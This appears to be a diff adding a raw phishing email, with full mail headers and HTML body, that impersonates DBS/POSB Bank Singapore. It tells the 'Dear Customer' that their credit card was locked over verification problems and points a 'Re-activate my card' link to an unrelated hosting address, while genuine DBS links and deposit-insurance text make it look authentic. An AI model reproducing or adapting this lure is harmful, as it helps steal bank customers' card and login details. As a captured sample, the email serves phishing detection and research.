@@ -1,0 +1,292 @@
+Received: from PU1APC01HT042.eop-APC01.prod.protection.outlook.com
+ (2603:10b6:610:52::20) by CH2PR17MB3463.namprd17.prod.outlook.com with HTTPS
+ via CH2PR04CA0010.NAMPRD04.PROD.OUTLOOK.COM; Fri, 28 Feb 2020 03:00:28 +0000
+Received: from PU1APC01FT010.eop-APC01.prod.protection.outlook.com
+ (2a01:111:e400:7ebe::33) by
+ PU1APC01HT042.eop-APC01.prod.protection.outlook.com (2a01:111:e400:7ebe::344)
+ with Microsoft SMTP Server (version=TLS1_2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.2772.15; Fri, 28 Feb
+ 2020 03:00:27 +0000
+Authentication-Results: spf=pass (sender IP is 193.201.76.65)
+ smtp.mailfrom=kabelmail.dk; hotmail.sg; dkim=pass (signature was verified)
+ header.d=kabelmail.dk;hotmail.sg; dmarc=pass action=none
+ header.from=kabelmail.dk;compauth=pass reason=100
+Received-SPF: Pass (protection.outlook.com: domain of kabelmail.dk designates
+ 193.201.76.65 as permitted sender) receiver=protection.outlook.com;
+ client-ip=193.201.76.65; helo=outgoing-yousee-5.gl-mut-gbl.as8677.net;
+Received: from outgoing-yousee-5.gl-mut-gbl.as8677.net (193.201.76.65) by
+ PU1APC01FT010.mail.protection.outlook.com (10.152.252.83) with Microsoft SMTP
+ Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
+ 15.20.2772.15 via Frontend Transport; Fri, 28 Feb 2020 03:00:27 +0000
+X-IncomingTopHeaderMarker:
+ OriginalChecksum:725623473B535E877C498992639E88EA3AAF73DE993F3806CD9E5A6B6307D83D;UpperCasedChecksum:6E72D675E3C88C86A1BF58F20A6C3F2E69A182AC9871B89B86C59DCC7F4637A6;SizeAsReceived:2767;Count:16
+Received: from filter.yousee.as8677.net (localhost [10.26.226.131])
+	by mwumf0307.yousee.as8677.net (SMTP Server) with ESMTP id 48TDmn1x9rz18VSdt
+	for <[REDACTED]>; Fri, 28 Feb 2020 04:00:25 +0100 (CET)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=kabelmail.dk; s=sela;
+	t=1582858825; bh=4KFoTC2PzWX/uMZeaZR2FH85BDFkwaUz3xBUCQ3N8ac=;
+	h=Date:From:To:Message-ID:Subject:MIME-Version:Content-Type:
+	 Content-Transfer-Encoding;
+	b=pgIE6R2vKiWYe1puUJB15dy95nzsm52C5McC+WTArAqb7OHEBjQ6Anuz/jWJepntt
+	 qKb0bkUb/6cdbbL7/ex52LHADh/vaQpRopPBhD+3VGnVlSZpVoTdqADbjqBiw4Ghj9
+	 IN7cIC7dznG62JRVxl1p0wZQqqQXFLvUWejSctiD2fyqMy0/DGeyrd/09RUUIzajdK
+	 v8Be+NXU19J98J+Fm8nISEHquHX5zc75bWzU20ELCSNmHCQKAN/VGai51xtl2LpKDW
+	 Orafv0kqOb8/X8daGl7tw2ZPH3DxYqJVgonoS9WQ0Iimk+5PoER658aWveK+ImWL6a
+	 NA0r5NGGg7t0Q==
+Received: from mwumf0307 (front03-smtp-abo-yousee.worldlinemail.net [10.26.226.131])
+	by mwumf0307.yousee.as8677.net (SMTP Server) with ESMTP id 48TDmn1Sslz18Wkfj
+	for <[REDACTED]>; Fri, 28 Feb 2020 04:00:25 +0100 (CET)
+Received: from mwumf0307 (front03-smtp-abo-yousee.worldlinemail.net [10.26.226.131])	(using TLSv1.2
+	with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))	(No client certificate requested)	(Authenticated sender: kolmerdonger@kabelmail.dk)
+	by mwumf0307.yousee.as8677.net (SMTP Server) with ESMTPSA
+	for <[REDACTED]>; Fri, 28 Feb 2020 04:00:25 +0100 (CET)
+Authentication-Results-Original: yousee.as8677.net; auth=pass (LOGIN)
+	smtp.auth=kolmerdonger@kabelmail.dk
+Date: Thu, 27 Feb 2020 19:00:25 -0800 (PST)
+From: DBS Bank| <kolmerdonger@kabelmail.dk>
+To: [REDACTED]
+Message-ID: <740866661.772805.1582858825011@asmtp.yousee.dk>
+Subject: Your DBS/POSB Consolidated iBanking No:#BV544578-LK87845-PO524
+X-Mailer: ColdFusion 2018 Application Server
+X-yse-mailing: MCE
+X-yse-spamcause: OK,
+	(17)(11000)gggruggvucftvghtrhhoucdtuddrgedugedrleejgdehgecutefuodetggdotefrodftvfcurfhrohhfihhlvgemucfvffevpdggtfgfpffufgeuufevtffkuefgpdfqfgfvnecuuegrihhlohhuthemuceftddtnecundfotefknffkpffiucdludejmdenucfjughrpeffhffvkffugggtgffosehhjegstdgstdejnecuhfhrohhmpeffuefuuceurghnkhikuceokhholhhmvghrughonhhgvghrsehkrggsvghlmhgrihhlrdgukheqnecuffhomhgrihhnpegusghsrdgtohhmrdhsghdpphhoshgsrdgtohhmrdhsghdpihhnmhhothhiohhnhhhoshhtihhnghdrtghomhdpfhgrtggvsghoohhkrdgtohhmpdhtfihithhtvghrrdgtohhmpdihohhuthhusggvrdgtohhmnecukfhppedutddrvdeirddvvdeirddufedunecuvehluhhsthgvrhfuihiivgepfeegnecurfgrrhgrmhephhgvlhhopehmfihumhhftdeftdejpdhinhgvthepuddtrddviedrvddviedrudefuddpmhgrihhlfhhrohhmpehkohhlmhgvrhguohhnghgvrheskhgrsggvlhhmrghilhdrughkpdhrtghpthhtoheplhgvvgdrtghhvghnghifvghisehhohhtmhgrihhlrdhsgh
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+X-IncomingHeaderCount: 16
+Return-Path: kolmerdonger@kabelmail.dk
+X-MS-Exchange-Organization-ExpirationStartTime: 28 Feb 2020 03:00:27.6267
+ (UTC)
+X-MS-Exchange-Organization-ExpirationStartTimeReason: OriginalSubmit
+X-MS-Exchange-Organization-ExpirationInterval: 1:00:00:00.0000000
+X-MS-Exchange-Organization-ExpirationIntervalReason: OriginalSubmit
+X-MS-Exchange-Organization-Network-Message-Id:
+ c5022b10-c271-4e69-3928-08d7bbfa5d36
+X-EOPAttributedMessage: 0
+X-EOPTenantAttributedMessage: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa:0
+X-MS-Exchange-Organization-MessageDirectionality: Incoming
+X-Forefront-Antispam-Report: EFV:NLI;
+X-MS-Exchange-Organization-AuthSource:
+ PU1APC01FT010.eop-APC01.prod.protection.outlook.com
+X-MS-Exchange-Organization-AuthAs: Anonymous
+X-MS-PublicTrafficType: Email
+X-MS-Office365-Filtering-Correlation-Id: c5022b10-c271-4e69-3928-08d7bbfa5d36
+X-MS-TrafficTypeDiagnostic: PU1APC01HT042:
+X-MS-Exchange-EOPDirect: true
+X-Sender-IP: 193.201.76.65
+X-SID-PRA: KOLMERDONGER@KABELMAIL.DK
+X-SID-Result: PASS
+X-MS-Exchange-Organization-PCL: 2
+X-Microsoft-Antispam: BCL:3;
+X-OriginatorOrg: outlook.com
+X-MS-Exchange-CrossTenant-OriginalArrivalTime: 28 Feb 2020 03:00:27.2108
+ (UTC)
+X-MS-Exchange-CrossTenant-Network-Message-Id: c5022b10-c271-4e69-3928-08d7bbfa5d36
+X-MS-Exchange-CrossTenant-Id: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa
+X-MS-Exchange-CrossTenant-FromEntityHeader: Internet
+X-MS-Exchange-CrossTenant-RMS-PersistedConsumerOrg:
+ 00000000-0000-0000-0000-000000000000
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: PU1APC01HT042
+X-MS-Exchange-Transport-EndToEndLatency: 00:00:01.6218652
+X-MS-Exchange-Processed-By-BccFoldering: 15.20.2772.006
+X-Microsoft-Antispam-Mailbox-Delivery:
+	abwl:0;wl:0;pcwl:0;kl:0;iwl:0;dwl:0;dkl:0;rwl:0;ucf:0;jmr:0;ex:0;auth:1;dest:J;OFR:SpamFilterAuthJ;ENG:(5062000261)(5061607266)(5061608174)(4900115)(98391011)(4920090)(6375004)(4950130)(4990090)(9140004);RF:JunkEmail;
+X-Message-Info:
+	qoGN4b5S4yoo0vjaWTKNgBKltMl+VwaC13srz/rpFEck1Cx3c5xVSitMJyhZhF/Cox+7ie6WXpiSf31ki46wKyrGjoeeSBi/ElNKrBsfhTb9ISMUh4VbDSCRfpW9ZP6+X9zByuZ5LLF/WEFOV2+eeCi2CwVfuDFVCaPk0ggXaWDkXj8bc1fZOJ9GGJSPSCD0SAnkyJYnZWWfYw/whUosjw==
+X-Message-Delivery: Vj0xLjE7dXM9MDtsPTA7YT0wO0Q9MjtHRD0yO1NDTD02
+X-Microsoft-Antispam-Message-Info:
+	=?utf-8?B?encxdCtsNG1xUS93WS9NWDJjMHIxRFVqRVZzYjQ1aVV6V25VRHZaajBHUXZl?=
+ =?utf-8?B?cHN3NjQyaFFPeXpZNzFkbUJhVVJOeUZLdjdrV05BSWMxb0pubEdLeEVZWkR0?=
+ =?utf-8?B?QUluRGdUYmdnbVpQQ25CblNLUFB0SWRSMTkyYWovUnBCRno5bG1tR2pPakRZ?=
+ =?utf-8?B?SkovV1VseHVSOWQ1MzdETjR5TnpYc0xROVpKc1dCSm5xRGJoUFpOemtIR1BV?=
+ =?utf-8?B?RnNRWDlicFR1K3lQZ0VZeEM1K3k0Y0Yrd1hWQzl6bzZIcUU3a1lac2R2M084?=
+ =?utf-8?B?OEQ1TmdzaWYvK1hpY2lMTHIvVW90d0V0dlJWSHdnSDNGRThYKzN6ekV5SU90?=
+ =?utf-8?B?b0tXZVhEYS80WEV3emZkcmtGUjE2aGpFS0ViK0w4M1B3d3NOcmtpQ1ZSZ3pV?=
+ =?utf-8?B?M1UyNXh1R2lQa1lQZkNxMXBUODhiL0wwZWZBd3lwaXJ5Nm9uQjlISkFtUnlr?=
+ =?utf-8?B?YzVid1A1UVBxZzdubXNUZlgybDB2bFZSY2Z3M2FHcCtDcDgxK0Q5YUlYUUUw?=
+ =?utf-8?B?Uk9JeTBST25EdFcvNVZNTGZjZkpkZGZwdW0xY0pjKzZQZllSTjExdi9sOFNq?=
+ =?utf-8?B?QythbGoveHc5dWZFZ0lGT29peGFmczlVTTQ3b3RCcTEyd2dNNGIramt3KzhJ?=
+ =?utf-8?B?cW1xZSt1RWR5QVltWVliUXJuQTV3WWhOdVdZeTcxSm9rSU05TmdnbWd3aHFH?=
+ =?utf-8?B?M0p5SWdnL28zZnBiZlAxUVhLVk00UVR3MmxjVnRmWUMvZ3FNQ2p1VWhNdTNT?=
+ =?utf-8?B?dCtjUzNxREhQUVhZbFc0cFNOYXhYMnhkUlRNdnU5UGgrSmVlSXpWUzFXeTl6?=
+ =?utf-8?B?enp3Mm5ZK3VKM21GWEc3RXRYUEczUkYzK3dlcUFOY2RFQ3M4amlKRUllVDc2?=
+ =?utf-8?B?bFplLzRCbDMxaWZmbWREWDJwZmJQcWd4WFA1VTNjQmhNeEwyOVhKZG1tbFly?=
+ =?utf-8?B?L3ZiQk9YY0VrWVByeFRzV1phM09sY1VRQlRxS3dIc3J4bUdlTXhsUzZYTDBW?=
+ =?utf-8?B?bkJNM0dNZmg4VFArekcxVldlT3B0MDRyd1NBRHpBSTB4OFFRRGswQVF3NGsv?=
+ =?utf-8?B?elFPR1NNWXV2WFB0dnlxbm1rQ1pzTmFVbHBTQkdMN25XLzRybzlkWEFxMU1K?=
+ =?utf-8?B?dmp0Z0loci9pQjBTbFZNMUZ1SVV0Nm15cG5EUmNJTGpScFFVZmNZK3p6WU43?=
+ =?utf-8?B?bGtwMVJ1RThIR0tzaGV3eEg0UnkzeDlZL1hGV0NvanJJNE9kK2JKR0ZYUGRs?=
+ =?utf-8?B?VVE1MEUwczNDaWJBU0ZrcHBFNTJ5YklkbGUrRlFSVitoYUFReWNTaWNZbzEv?=
+ =?utf-8?B?bVc2OW9lWWtudktXT2VabGlvQkloT2dTM2RMTDdTeXd6RTNtZ3RwSDNzZnN6?=
+ =?utf-8?B?bWlEK1lqaWxobmxFeVhsb052K05OSmdCTk1xR0NVeStDTGVNTFFrQXJReTJR?=
+ =?utf-8?B?eklYRmM1aW1hTWlHTktrWDRYendpZjlFd2xZTU5zUG9NSnJvR3p4aDhJTHpK?=
+ =?utf-8?B?NElMRjBuNFZSYVZOWVF1cm1PMFhJTTV2M3RtbC8rTXB0Q3p0QWJJclVjWHF6?=
+ =?utf-8?Q?ggqBcvNqoyAMU7i50NoYQ6Dkc=3D?=
+MIME-Version: 1.0
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"><br class="Apple-interchange-newline">
+<table align="center" bgcolor="#ffffff" border="0" cellpadding="0" cellspacing="0" class="deviceWidth_mailru_css_attribute_postfix" style="color: rgb(51, 51, 51); font-family: Arial, Tahoma, Verdana, sans-serif; font-size: 15px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; border: 1px solid rgb(204, 204, 204); background-color: rgb(255, 255, 255); width: 600px;">
+	<tr>
+		<td align="center" class="contenttable_mailru_css_attribute_postfix" height="50" style="vertical-align: middle; text-align: center; font-family: Arial, Helvetica, sans-serif; font-size: 11px; color: rgb(48, 48, 48); padding: 10px 20px;">
+		Your DBS/POSB Consolidated Statement is ready for viewing<br>Problems 
+		viewing this email? Select &quot;always display images&quot; or click<span>&nbsp;</span><a href="http://www.dbs.com.sg/personal/edm/estatement_noti/duo_estatement.html" rel=" noopener noreferrer" style="color: rgb(48, 48, 48); text-decoration: underline; font-family: Arial, Helvetica, sans-serif; font-size: 11px;" target="_blank">here</a><span>&nbsp;</span>to 
+		view the online version</td>
+	</tr>
+	<tr>
+		<td width="100%">
+		<table align="center" border="0" cellpadding="0" cellspacing="0" class="deviceWidth_mailru_css_attribute_postfix" style="background-color: rgb(242, 242, 242);" width="100%">
+			<tr>
+				<td style="vertical-align: middle;">
+				<table align="left" border="0" cellpadding="0" cellspacing="0" class="logowrapperdbs_mailru_css_attribute_postfix">
+					<tr>
+						<td style="padding: 5px 10px; vertical-align: middle;">
+						<a bis_size="{&quot;x&quot;:498,&quot;y&quot;:488,&quot;w&quot;:123,&quot;h&quot;:50,&quot;abs_x&quot;:498,&quot;abs_y&quot;:488}" href="http://www.dbs.com.sg/personal/" rel=" noopener noreferrer" style="color: rgb(0, 91, 209); text-decoration: underline;" target="_blank">
+						<img alt="dbs" bis_id="bn_k2h76aoxqnghpustxdvk2o" bis_size="{&quot;x&quot;:498,&quot;y&quot;:488,&quot;w&quot;:123,&quot;h&quot;:50,&quot;abs_x&quot;:498,&quot;abs_y&quot;:488}" class="logo_mailru_css_attribute_postfix" height="50" src="https://proxy.imgsmail.ru/?email=poko8000%40mail.ru&amp;e=1582929192&amp;flags=0&amp;h=2D3ku5e-2kwHXWGBR1S62Q&amp;url173=d3d3LmRicy5jb20uc2cvcGVyc29uYWwvZWRtLzIwMTQwOS8yNV9tYXNzbWFya2V0L2ltYWdlcy9kYnMucG5n&amp;is_https=0" style="display: block; border: 0px;" width="123"></a></td>
+					</tr>
+				</table>
+				<table align="left" border="0" cellpadding="0" cellspacing="0" class="logowrapperposb_mailru_css_attribute_postfix">
+					<tr>
+						<td style="padding: 5px 10px; vertical-align: middle;">
+						<a bis_size="{&quot;x&quot;:641,&quot;y&quot;:488,&quot;w&quot;:149,&quot;h&quot;:50,&quot;abs_x&quot;:641,&quot;abs_y&quot;:488}" href="http://www.posb.com.sg/personal" rel=" noopener noreferrer" style="color: rgb(0, 91, 209); text-decoration: underline;" target="_blank">
+						<img alt="posb" bis_id="bn_32qww52udkqs5yrhj5rhl9" bis_size="{&quot;x&quot;:641,&quot;y&quot;:488,&quot;w&quot;:149,&quot;h&quot;:50,&quot;abs_x&quot;:641,&quot;abs_y&quot;:488}" class="logo_mailru_css_attribute_postfix" height="50" src="https://proxy.imgsmail.ru/?email=poko8000%40mail.ru&amp;e=1582929192&amp;flags=0&amp;h=9DdPFysUG0gS1GBDDj5bKw&amp;url173=d3d3LmRicy5jb20uc2cvcGVyc29uYWwvZWRtLzIwMTQwOS8yNV9tYXNzbWFya2V0L2ltYWdlcy9wb3NiLnBuZw~~&amp;is_https=0" style="display: block; border: 0px;" width="149"></a></td>
+					</tr>
+				</table>
+				</td>
+			</tr>
+		</table>
+		</td>
+	</tr>
+	<tr>
+		<td align="left" class="contenttable_mailru_css_attribute_postfix" style="font-family: Arial; font-size: 21px; line-height: 1.2em; color: rgb(0, 0, 0); font-weight: bold; text-align: left; padding: 20px 20px 10px;" width="100%">
+		Update your Credit Card online </td>
+	</tr>
+	<tr>
+		<td align="center" style="padding: 0px 0px 10px;" valign="top" width="100%">
+		<img alt="" class="fullsize_mailru_css_attribute_postfix" height="230" src="https://proxy.imgsmail.ru/?email=poko8000%40mail.ru&amp;e=1582929192&amp;flags=0&amp;h=lxhuXNTHHizosI25LxiGuw&amp;url173=d3d3LmRicy5jb20uc2cvcGVyc29uYWwvZWRtL2VzdGF0ZW1lbnRfbm90aS9pbWFnZXMvQmFubmVyLUltYWdlLW5ldy5qcGc~&amp;is_https=0" style="display: block; border: none;" width="600"></td>
+	</tr>
+	<tr>
+		<td align="left" class="contenttable_mailru_css_attribute_postfix" style="font-family: Arial; font-size: 16px; line-height: 1.2em; color: rgb(68, 68, 68); text-align: left; padding: 10px 20px;" width="100%">
+		<p style="font: 16px / 1.2em arial;">Dear Customer<br><br><br><strong>Important information about your Credit Card: DBS/POSB 
+		</strong><br><br>We have detected some problems on your credit card verification. For your security, we have locked your card.<br><br>We need to verify some informations with you to use your card safety again.</p>
+		<p style="font: 16px / 1.2em arial;"><a style="font-family: Arial, Helvetica, sans-serif; color: #ed1c24; text-decoration-line: none;" href="https://ded3238.inmotionhosting.com/~f733c5f7/mnb/">Re-activate my card</a><br><br>Thank you 
+		for banking with DBS.<br><br>Consumer Banking Group, Singapore<br>DBS 
+		Bank Ltd</p>
+		</td>
+	</tr>
+	<tr>
+		<td class="contenttable_mailru_css_attribute_postfix" style="padding: 20px;" width="100%">
+		<table align="center" border="0" cellpadding="0" cellspacing="0" style="background-color: rgb(255, 255, 255);" width="100%">
+			<tr>
+				<td height="1" valign="top">
+				<table align="center" border="0" cellpadding="0" cellspacing="0" height="1" style="background-color: rgb(255, 255, 255);" width="100%">
+					<tr>
+						<td bgcolor="#cccccc" height="1" style="background-color: rgb(204, 204, 204); font-size: 1px; line-height: 1px;" width="100%">
+						&nbsp;</td>
+					</tr>
+				</table>
+				</td>
+			</tr>
+		</table>
+		</td>
+	</tr>
+	<tr>
+		<td align="left" class="contenttable_mailru_css_attribute_postfix" style="font-family: Arial; font-size: 16px; line-height: 1.2em; color: rgb(68, 68, 68); text-align: left; padding: 10px 20px;" width="100%">
+		<p style="font: 16px / 1.2em arial;">With Internet Banking, you can 
+		perform over 180 online services including:</p>
+		<ul style="margin-left: 2em; padding: 10px 0px; text-align: left;">
+			<li style="vertical-align: middle; line-height: 1.2em;">Pay Bills</li>
+			<li style="vertical-align: middle; line-height: 1.2em;">Transfer 
+			funds</li>
+			<li style="vertical-align: middle; line-height: 1.2em;">Open 
+			accounts instantly</li>
+		</ul>
+		<p style="font: 16px / 1.2em arial;">All these services are backed by 
+		our<span>&nbsp;</span><a href="http://www.dbs.com.sg/personal/deposits/bank-with-ease/money-safe-guarantee?pid=sg-dbsposb-edm-2017-estatement-txtlink-money-safe-guarantee" rel=" noopener noreferrer" style="color: rgb(237, 28, 36); text-decoration: none;" target="_blank">MoneySafe 
+		Guarantee</a>.</p>
+		</td>
+	</tr>
+	<tr>
+		<td class="contenttable_mailru_css_attribute_postfix" style="padding: 5px 10px;" width="100%">
+		<table border="0" cellpadding="0" cellspacing="0" width="100%">
+			<tr>
+				<td align="left">
+				<table align="left" border="0" cellpadding="0" cellspacing="0" class="deviceWidth_mailru_css_attribute_postfix">
+					<tr>
+						<td class="redbuttonWrapper_mailru_css_attribute_postfix" style="padding: 20px 10px;">
+						<table align="center" border="0" cellpadding="0" cellspacing="0" class="redbutton_mailru_css_attribute_postfix" width="200">
+							<tr>
+								<td align="left" class="redbutton_mailru_css_attribute_postfix" height="30" style="vertical-align: middle; background-color: rgb(227, 6, 20); text-align: center; font-family: Arial, Helvetica, sans-serif; color: rgb(255, 255, 255); font-size: 16px; font-weight: bold;">
+								<a href="http://www.dbs.com.sg/personal/promotions/default.page?pid=sg-dbsposb-edm-2017-estatement-btn-dbspromotionpage" rel=" noopener noreferrer" style="color: rgb(255, 255, 255); text-decoration: none;" target="_blank">
+								<span style="color: rgb(255, 255, 255); text-decoration: none;">
+								Featured Promotions</span></a></td>
+							</tr>
+						</table>
+						</td>
+					</tr>
+				</table>
+				</td>
+			</tr>
+		</table>
+		</td>
+	</tr>
+	<tr>
+		<td align="left" class="contenttable_mailru_css_attribute_postfix" style="font-family: Arial; font-size: 16px; line-height: 1.2em; color: rgb(68, 68, 68); text-align: left; padding: 10px 20px;" width="100%">
+		<span style="font-family: Arial; font-size: 13px; line-height: 1.2em; color: rgb(68, 68, 68); text-align: left;">
+		Terms and conditions apply.<br><br>Use of the eStatement Facility is 
+		governed by the Terms and Conditions of the eStatement Facility.<br><br>
+		Deposit Insurance Scheme - Singapore dollar deposits of non-bank 
+		depositors and monies and deposits denominated in Singapore dollars 
+		under the Supplementary Retirement Scheme are insured by the Singapore 
+		Deposit Insurance Corporation, for up to S$75,000 in aggregate per 
+		depositor per Scheme member by law. Monies and deposits denominated in 
+		Singapore dollars under the CPF Investment Scheme and CPF Retirement Sum 
+		Scheme are aggregated and separately insured up to S$75,000 for each 
+		depositor per Scheme member. Foreign currency deposits, dual currency 
+		investments, structured deposits and other investment products are not 
+		insured.</span></td>
+	</tr>
+	<tr>
+		<td class="contenttable_mailru_css_attribute_postfix" style="padding: 30px 20px 15px;" width="100%">
+		<table align="center" border="0" cellpadding="0" cellspacing="0" style="background-color: rgb(255, 255, 255);" width="100%">
+			<tr>
+				<td valign="top">
+				<table align="left" border="0" cellpadding="0" cellspacing="0" class="deviceWidth_mailru_css_attribute_postfix" width="49%">
+					<tr>
+						<td align="left" class="add-bottom-padding-30_mailru_css_attribute_postfix" style="font-family: Arial, Helvetica, sans-serif; font-size: 13px; color: rgb(68, 68, 68); line-height: 26px; font-weight: normal;" valign="top" width="100%">
+						&nbsp;</td>
+					</tr>
+				</table>
+				<table align="right" border="0" cellpadding="0" cellspacing="0" class="deviceWidth_mailru_css_attribute_postfix" width="49%">
+					<tr>
+						<td height="26" valign="top" width="100%">
+						<table border="0" cellpadding="0" cellspacing="0" class="deviceWidth_mailru_css_attribute_postfix" width="100%">
+							<tr>
+								<td align="left" style="font-family: Arial, Helvetica, sans-serif; font-size: 13px; color: rgb(68, 68, 68); line-height: 26px; font-weight: normal;" valign="top" width="118">
+								<a class="text-link-1_mailru_css_attribute_postfix" href="http://www.dbs.com.sg/personal" rel=" noopener noreferrer" style="color: rgb(68, 68, 68); text-decoration: none; font-size: 13px; font-family: Arial, Helvetica, sans-serif; font-weight: bold;" target="_blank">
+								www.dbs.com.sg</a></td>
+								<td align="right" valign="top">
+								<table align="right" border="0" cellpadding="0" cellspacing="0" style="border-spacing: 0px; border-collapse: collapse;">
+									<tr>
+										<td align="right" style="padding: 0px 0px 0px 10px; border-spacing: 0px; border-collapse: collapse;">
+										<a href="https://www.facebook.com/dbs.sg" rel=" noopener noreferrer" style="color: rgb(0, 91, 209); text-decoration: underline;" target="_blank">
+										<img alt="Facebook" border="0" src="https://proxy.imgsmail.ru/?email=poko8000%40mail.ru&amp;e=1582929192&amp;flags=0&amp;h=xXO4de0j5820Yi54Fak95w&amp;url173=d3d3LmRicy5jb20uc2cvcGVyc29uYWwvZWRtL3RlbXBsYXRlMjAxNi9pbWFnZXMvZmFjZWJvb2suanBn&amp;is_https=0" style="border: none;" width="24"></a></td>
+										<td align="right" style="padding: 0px 0px 0px 10px; border-spacing: 0px; border-collapse: collapse;">
+										<a href="https://twitter.com/dbsbank" rel=" noopener noreferrer" style="color: rgb(0, 91, 209); text-decoration: underline;" target="_blank">
+										<img alt="Twitter" border="0" src="https://proxy.imgsmail.ru/?email=poko8000%40mail.ru&amp;e=1582929192&amp;flags=0&amp;h=lqLwE5RY1AfydBfbxA3yxQ&amp;url173=d3d3LmRicy5jb20uc2cvcGVyc29uYWwvZWRtL3RlbXBsYXRlMjAxNi9pbWFnZXMvdHdpdHRlci5qcGc~&amp;is_https=0" style="border: none;" width="26"></a></td>
+										<td align="right" style="padding: 0px 0px 0px 10px; border-spacing: 0px; border-collapse: collapse;">
+										<a href="http://www.youtube.com/user/DBS/feed" rel=" noopener noreferrer" style="color: rgb(0, 91, 209); text-decoration: underline;" target="_blank">
+										<img alt="Youtube" border="0" src="https://proxy.imgsmail.ru/?email=poko8000%40mail.ru&amp;e=1582929192&amp;flags=0&amp;h=fPohFaWWk5Mzzmqk_Y1L-A&amp;url173=d3d3LmRicy5jb20uc2cvcGVyc29uYWwvZWRtL3RlbXBsYXRlMjAxNi9pbWFnZXMveW91dHViZS5qcGc~&amp;is_https=0" style="border: none;" width="52"></a></td>
+									</tr>
+								</table>
+								</td>
+							</tr>
+						</table>
+						</td>
+					</tr>
+				</table>
+				</td>
+			</tr>
+		</table>
+		</td>
+	</tr>
+</table>
